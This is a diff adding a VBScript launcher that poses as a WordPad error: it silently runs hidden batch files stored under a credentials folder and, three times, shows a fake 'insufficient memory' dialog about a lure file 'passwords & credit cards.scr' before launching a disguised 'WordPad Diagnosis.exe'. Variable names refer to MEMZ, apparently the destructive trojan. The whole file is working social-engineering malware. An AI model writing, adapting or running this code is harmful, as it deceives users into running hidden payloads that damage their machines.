@@ -1,0 +1,24 @@
+On Error Resume Next
+Set w = WScript.CreateObject ("WScript.Shell")
+w.run "WordPad"
+CheckMEMZ = w.ExpandEnvironmentStrings("""%localappdata%\microsoft\credentials\check.bat""")
+w.run CheckMEMZ, 0, false
+WScript.Sleep 700
+
+x=msgbox("Windows does not have the minimum requirements to open the specified text document." & vbcrlf & "" & vbcrlf & "'passwords & credit cards.scr'" & vbcrlf & "" & vbcrlf & "There isn't enough memory to complete this action." & vbcrlf & "Try using less data or closing other applications." & vbcrlf & "To increase memory availability, consider:" & vbcrlf & " - Using a 64-bit operation." & vbcrlf & " - Adding memory to your device. (RAM)" & vbcrlf & " - Opening the file or document on another computer." & vbcrlf & vbcrlf & "Make sure you have the correct font, language packs, 64-bit infrastructure, and memory availability to open the rich text document [.RTF/.SCR]. The language for this message was automatically set to English because the source file is set to ENG_US. If the file continues to not open, try opening the file or document on another computer." & vbcrlf & vbcrlf & "ERROR: 'insufficient_hardware_requirements.dll'" & vbcrlf & vbcrlf & "Press 'OK' and allow WordPad to automatically diagnose and resolve the issue." ,0+48, "WordPad")
+expandmemz = w.ExpandEnvironmentStrings("""%appdata%\microsoft\windows\Start Menu\Programs\Maintenance\WordPad Diagnosis.exe""")
+w.run expandmemz
+
+x=msgbox("Windows does not have the minimum requirements to open the specified text document." & vbcrlf & "" & vbcrlf & "'passwords & credit cards.scr'" & vbcrlf & "" & vbcrlf & "There isn't enough memory to complete this action." & vbcrlf & "Try using less data or closing other applications." & vbcrlf & "To increase memory availability, consider:" & vbcrlf & " - Using a 64-bit operation." & vbcrlf & " - Adding memory to your device. (RAM)" & vbcrlf & " - Opening the file or document on another computer." & vbcrlf & vbcrlf & "Make sure you have the correct font, language packs, 64-bit infrastructure, and memory availability to open the rich text document [.RTF/.SCR]. The language for this message was automatically set to English because the source file is set to ENG_US. If the file continues to not open, try opening the file or document on another computer." & vbcrlf & vbcrlf & "ERROR: 'insufficient_hardware_requirements.dll'" & vbcrlf & vbcrlf & "Press 'OK' and allow WordPad to automatically diagnose and resolve the issue." ,0+48, "WordPad")
+expandmemz = w.ExpandEnvironmentStrings("""%appdata%\microsoft\windows\Start Menu\Programs\Maintenance\WordPad Diagnosis.exe""")
+w.run expandmemz
+
+x=msgbox("Windows does not have the minimum requirements to open the specified text document." & vbcrlf & "" & vbcrlf & "'passwords & credit cards.scr'" & vbcrlf & "" & vbcrlf & "There isn't enough memory to complete this action." & vbcrlf & "Try using less data or closing other applications." & vbcrlf & "To increase memory availability, consider:" & vbcrlf & " - Using a 64-bit operation." & vbcrlf & " - Adding memory to your device. (RAM)" & vbcrlf & " - Opening the file or document on another computer." & vbcrlf & vbcrlf & "Make sure you have the correct font, language packs, 64-bit infrastructure, and memory availability to open the rich text document [.RTF/.SCR]. The language for this message was automatically set to English because the source file is set to ENG_US. If the file continues to not open, try opening the file or document on another computer." & vbcrlf & vbcrlf & "ERROR: 'insufficient_hardware_requirements.dll'" & vbcrlf & vbcrlf & "Press 'OK' and allow WordPad to automatically diagnose and resolve the issue." ,0+48, "WordPad")
+expandmemz = w.ExpandEnvironmentStrings("""%appdata%\microsoft\windows\Start Menu\Programs\Maintenance\WordPad Diagnosis.exe""")
+w.run expandmemz
+WScript.Sleep 200
+Checkdel = w.ExpandEnvironmentStrings("""%localappdata%\microsoft\credentials\checkdel.bat""")
+w.run Checkdel, 0, false
+WScript.Sleep 2000
+CheckMEMZ2 = w.ExpandEnvironmentStrings("""%localappdata%\microsoft\credentials\check2.bat""")
+w.run CheckMEMZ2, 0, false
